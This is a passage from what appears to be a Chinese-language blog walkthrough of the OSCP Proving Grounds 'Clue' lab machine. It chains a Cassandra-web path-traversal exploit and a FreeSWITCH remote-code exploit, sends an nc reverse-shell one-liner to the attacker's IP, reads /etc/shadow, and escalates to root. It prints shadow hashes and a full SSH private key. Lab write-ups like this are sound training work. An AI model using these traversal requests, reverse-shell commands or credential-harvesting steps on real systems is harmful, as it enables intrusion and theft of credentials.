+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ntp:x:106:113::/nonexistent:/usr/sbin/nologin
+cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
+cassie:x:1000:1000::/home/cassie:/bin/bash
+freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
+anthony:x:1001:1001::/home/anthony:/bin/bash
+</pre></p>
+</div>
+<p>能用，发现了用户cassie和anthony. 另外，这个exploit里有提示:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+cat 49362.py 
+.....
+# Usage
+# &gt; cassmoney.py 10.0.0.5 /etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# bin:x:2:2:bin:/bin:/usr/sbin/nologin
+#
+# &gt; cassmoney.py 10.0.0.5 /proc/self/cmdline
+# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
+#
+# (these creds are for auth to the running apache cassandra database server)
+....
+</pre>
+</div>
+<p>可以用第二条指令来dump 运行cassandra-web时的用户名和密码，尝试:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+python3 49362.py -p 3000 192.168.170.240 &#039;/proc/self/cmdline&#039;
+<p>/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
+</pre></p>
+</div>
+<p>获得了cassie的密码<strong>SecondBiteTheApple330</strong>. SSH/22端口开启，尝试以cassie登录:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+ssh cassie@192.168.170.240
+cassie@192.168.170.240&#039;s password: 
+Permission denied, please try again.
+</pre>
+</div>
+<p>失败，可能是不允许cassie ssh登录？尝试用这个密码以Anthony登录看看有没有密码复用，但也失败。</p>
+<p>在下载下来的freeswitch目录下运行grep查找密码：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+freeswitch grep -r password
+etc/freeswitch/autoload_configs/event_socket.conf.xml:    &lt;param name="password" value="ClueCon"/&gt;
+</pre>
+</div>
+<p>发现了这个文件 <strong>event_socket.conf.xml</strong> 结合上面freeswitch的exploit, <strong>ClueCon</strong>是这个软件的默认密码，密码应该就保存在这个文件里。我们又可以用另一个cassandra的exploit任意读取文件，那么应该就可以获取正在运行的freeswitch的密码：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+python3 49362.py -p 3000 192.168.170.240 &#039;/etc/freeswitch/autoload_configs/event_socket.conf.xml&#039;
+<p>&lt;configuration name=&ldquo;event_socket.conf&rdquo; description=&ldquo;Socket Client&rdquo;&gt;
+&lt;settings&gt;
+&lt;param name=&ldquo;nat-map&rdquo; value=&ldquo;false&rdquo;/&gt;
+&lt;param name=&ldquo;listen-ip&rdquo; value=&ldquo;0.0.0.0&rdquo;/&gt;
+&lt;param name=&ldquo;listen-port&rdquo; value=&ldquo;8021&rdquo;/&gt;
+&lt;param name=&ldquo;password&rdquo; value=&ldquo;StrongClueConEight021&rdquo;/&gt;
+&lt;/settings&gt;
+&lt;/configuration&gt;
+</pre></p>
+</div>
+<p>成功获得现在的密码，修改exploit里的密码为StrongClueConEight021并运行：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="859" height="214" src="../legacy/uploads/2025/04/1745589040-image.png" alt="" class="wp-image-1364" srcset="../legacy/uploads/2025/04/1745589040-image.png 859w, ../legacy/uploads/2025/04/1745589040-image-300x75.png 300w, ../legacy/uploads/2025/04/1745589040-image-768x191.png 768w" sizes="auto, (max-width: 859px) 100vw, 859px" /> </figure></p>
+<p>成功获得RCE，使用<a href="https://www.revshells.com/" target="_blank"  rel="nofollow" ><a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >https://www.revshells.com/</a></a> 生成一个reverse shell，打开监听尝试:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+python3 47799.py 192.168.170.240 &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&1|nc 192.168.45.238 8021 &gt;/tmp/f&#039;
+<p>nc -nlvp 8021
+listening on [any] 8021 &hellip;
+connect to [192.168.45.238] from (UNKNOWN) [192.168.170.240] 41968
+sh: 0: can't access tty; job control turned off
+$ id
+uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
+$
+</pre></p>
+</div>
+<p>成功获得shell，可以用之前获得的cassie的密码 su到cassie</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+su cassie
+Password: SecondBiteTheApple330
+id
+uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
+</pre>
+</div>
+<h2 id="root">Root
+</h2><p>先用python升级一下shell, 又发现cassie可以以sudo运行/usr/local/bin/cassandra-web, 运行一下看看：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+python -c &#039;import pty; pty.spawn("/bin/bash")&#039;
+cassie@clue:/$ sudo -l
+sudo -l
+Matching Defaults entries for cassie on clue:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<p>User cassie may run the following commands on clue:
+(ALL) NOPASSWD: /usr/local/bin/cassandra-web</p>
+<p>cassie@clue:/$ sudo /usr/local/bin/cassandra-web
+sudo /usr/local/bin/cassandra-web
+I, [2025-04-25T09:54:22.528305 #1828]  INFO &ndash; : Establishing control connection
+W, [2025-04-25T09:54:22.530872 #1828]  WARN &ndash; : Host 127.0.0.1 refused all connections
+Cassandra::Errors::AuthenticationError: Server requested authentication, but client was not configured to authenticate</p>
+<p>Usage: cassandra-web [options]
+-B, &ndash;bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
+-H, &ndash;hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)
+-P, &ndash;port PORT                  integer port that cassandra is running on (default: 9042)
+-L, &ndash;log-level LEVEL            log level (default: info)
+-u, &ndash;username USER              username to use when connecting to cassandra
+-p, &ndash;password PASS              password to use when connecting to cassandra
+-C, &ndash;compression NAME           compression algorithm to use (lz4 or snappy)
+&ndash;server-cert PATH           server ceritificate pathname
+&ndash;client-cert PATH           client ceritificate pathname
+&ndash;private-key PATH           path to private key
+&ndash;passphrase SECRET          passphrase for the private key
+-h, &ndash;help                       Show help
+</pre></p>
+</div>
+<p>看起来可以再运行一个cassandra的服务，并且这个服务是以sudo权限运行的，所以我们应该可以利用这个root权限的服务和之前使用的cassandra的exploit读取任意文件。以sudo开启cassandra服务，并绑定到1234端口：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+cassie@clue:/$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330
+&lt; -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330
+I, &#x5B;2025-04-25T09:56:21.312344 #1851]  INFO -- : Establishing control connection
+I, &#x5B;2025-04-25T09:56:21.389259 #1851]  INFO -- : Refreshing connected host&#039;s metadata
+I, &#x5B;2025-04-25T09:56:21.394232 #1851]  INFO -- : Completed refreshing connected host&#039;s metadata
+I, &#x5B;2025-04-25T09:56:21.394883 #1851]  INFO -- : Refreshing peers metadata
+I, &#x5B;2025-04-25T09:56:21.395813 #1851]  INFO -- : Completed refreshing peers metadata
+I, &#x5B;2025-04-25T09:56:21.395838 #1851]  INFO -- : Refreshing schema
+I, &#x5B;2025-04-25T09:56:21.423071 #1851]  INFO -- : Schema refreshed
+I, &#x5B;2025-04-25T09:56:21.423098 #1851]  INFO -- : Control connection established
+I, &#x5B;2025-04-25T09:56:21.423251 #1851]  INFO -- : Creating session
+I, &#x5B;2025-04-25T09:56:21.563511 #1851]  INFO -- : Session created
+2025-04-25 09:56:21 -0400 Thin web server (v1.8.1 codename Infinite Smoothie)
+2025-04-25 09:56:21 -0400 Maximum connections set to 1024
+2025-04-25 09:56:21 -0400 Listening on 0.0.0.0:1234, CTRL+C to stop
+</pre>
+</div>
+<p>这里我尝试对端口1234再用49362.py读取文件时，一直卡住，用nmap扫了一下显示端口1234关闭，可能是防火墙拦截了？也许只能从本地访问。看一下49362.py里是如何请求的:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+DT = &#039;../&#039;
+DT_NUM = 8
+......
+                payload = urllib.parse.quote_plus(DT * self.number + self.file)
+</pre>
+</div>
+<p>payload就是http://IP:PORT/加上DT_NUM个 &quot; <strong>../</strong> &ldquo;. 那么我们可以手动在本地请求，用47799再生成一个reverse shell后，请求新开启的cassandra服务:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+cassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../etc/shadow
+&lt;s 127.0.0.1:1234/../../../../../../../../etc/shadow
+root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::
+daemon:*:18555:0:99999:7:::
+bin:*:18555:0:99999:7:::
+sys:*:18555:0:99999:7:::
+sync:*:18555:0:99999:7:::
+games:*:18555:0:99999:7:::
+man:*:18555:0:99999:7:::
+lp:*:18555:0:99999:7:::
+mail:*:18555:0:99999:7:::
+news:*:18555:0:99999:7:::
+uucp:*:18555:0:99999:7:::
+proxy:*:18555:0:99999:7:::
+www-data:*:18555:0:99999:7:::
+backup:*:18555:0:99999:7:::
+list:*:18555:0:99999:7:::
+irc:*:18555:0:99999:7:::
+gnats:*:18555:0:99999:7:::
+nobody:*:18555:0:99999:7:::
+_apt:*:18555:0:99999:7:::
+systemd-timesync:*:18555:0:99999:7:::
+systemd-network:*:18555:0:99999:7:::
+systemd-resolve:*:18555:0:99999:7:::
+messagebus:*:18555:0:99999:7:::
+sshd:*:18555:0:99999:7:::
+systemd-coredump:!!:18555::::::
+ntp:*:19209:0:99999:7:::
+cassandra:!:19209:0:99999:7:::
+cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::
+freeswitch:!:19209::::::
+anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7:::
+</pre>
+</div>
+<p><strong><em>（注意这里要加上&ndash;path-as-is, 不然curl会把多个../给省略掉）</em></strong></p>
+<p>成功读取shadow文件. 可以下anthony home下读取anthony的id_rsa</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+cassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../home/anthony/.ssh/id_rsa
+&lt;34/../../../../../../../../home/anthony/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
+d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
+jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
+B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
+gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
+DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
+acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
+QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
+mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
+HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
+UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
+etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
+mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
+CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
+0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
+Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
+gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
+krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
+yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
+kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
+DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
+Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
+iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
+4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+</div>
+<p>保存到本地，并尝试用anthony登录:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+ssh -i id_rsa anthony@192.168.170.240                           
+anthony@192.168.170.240&#039;s password: 
+Permission denied, please try again.
+anthony@192.168.170.240&#039;s password: 
+Permission denied, please try again.
+anthony@192.168.170.240&#039;s password: 
+anthony@192.168.170.240: Permission denied (publickey,password).
+</pre>
+</div>
+<p>但却仍然提示要密码，奇怪了。尝试用root登录:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+ssh -i id_rsa root@192.168.170.240
+Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+<p>The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 29 17:57:54 2024
+root@clue:<del># id
+uid=0(root) gid=0(root) groups=0(root)
+root@clue:</del>#
+</pre></p>
+</div>
+<p>竟然成功了。。。 拿到root后也很迷，找了一圈后在anthony的bash_history里发现：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+root@clue:/home/anthony# cat .bash_history
+clear
+ls -la
+ssh-keygen
+cp .ssh/id_rsa.pub .ssh/authorized_keys
+sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
+exit
+</pre>
+</div>
+<p>anthony把自己的凭证复制到了root下 （<strong>?</strong> 疑惑）</p>
+<p>在root下可以找到proof.txt<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="615" height="56" src="../legacy/uploads/2025/04/1745590192-image.png" alt="" class="wp-image-1374" srcset="../legacy/uploads/2025/04/1745590192-image.png 615w, ../legacy/uploads/2025/04/1745590192-image-300x27.png 300w" sizes="auto, (max-width: 615px) 100vw, 615px" /> </figure></p>
+<p>在/var/lib/freeswitch下可以找到local.txt</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+root@clue:~# find / -name local.txt -type f
+/var/lib/freeswitch/local.txt
+</pre>
+</div>
+<p>另外，在防火墙设置下可以看到，确实block了除已开放端口外的数据流入流出：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+root@clue:~# sudo iptables -L -n -v
+Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+ 1922  220K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           
+38959 5695K ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW,RELATED,ESTABLISHED
+    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22
+    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80
+    1    40 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:445
+   14   560 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:3000
+    2    80 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8021
+    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
+    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
+    0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           
+<p>Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+pkts bytes target     prot opt in     out     source               destination</p>
+<p>Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
+pkts bytes target     prot opt in     out     source               destination      <br>
+1928  220K ACCEPT     all  &ndash;  *      lo      0.0.0.0/0            0.0.0.0/0        <br>
+277 46895 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:22 state NEW,ESTABLISHED
+0     0 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53 state NEW,ESTABLISHED
+98  6566 ACCEPT     udp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53 state NEW,ESTABLISHED
+36906   16M ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:80 state NEW,ESTABLISHED
+0     0 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 state NEW,ESTABLISHED
+49 10394 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:445 state NEW,ESTABLISHED
+4   224 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:139 state NEW,ESTABLISHED
+449  114K ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:3000 state NEW,ESTABLISHED
+47 46823 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:3000 state NEW,ESTABLISHED
+51  4082 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:8021 state NEW,ESTABLISHED
+25  4574 ACCEPT     tcp  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8021 state NEW,ESTABLISHED
+0     0 ACCEPT     icmp &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
+11   848 ACCEPT     icmp &ndash;  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
+238 19369 DROP       all  &ndash;  *      *       0.0.0.0/0            0.0.0.0/0</p>
+<p></pre></p>
+</div>
+<h2 id="what-i-have-learned">What I have learned
+</h2><ul class="wp-block-list">
+  <li>
+    在有可以任意读取文件的能力时，尝试获取每个用户home下的bash_history文件。
+  </li>
+  <li>
+    可以读取文件时，永远要记得查看/etc/ssh/sshd_config, 里面记录着哪些用户允许ssh登录。
+  </li>
+</ul><figure class="wp-block-image size-full">
+<p><img loading="lazy" decoding="async" width="687" height="296" src="../legacy/uploads/2025/04/1745590747-image.png" alt="" class="wp-image-1381" srcset="../legacy/uploads/2025/04/1745590747-image.png 687w, ../legacy/uploads/2025/04/1745590747-image-300x129.png 300w" sizes="auto, (max-width: 687px) 100vw, 687px" /> </figure></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Apr 25, 2025 14:19 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/oscp-pgp-readys-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/03/1743336789-gura-150x150.jpg" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/03/1743336789-gura-150x150.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">OSCP-PGP Readys Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Jowhite
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c360ad02a41a6ed7f0240895667de2af6b7bfd79a8c71b3ed3008667720bb9d1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
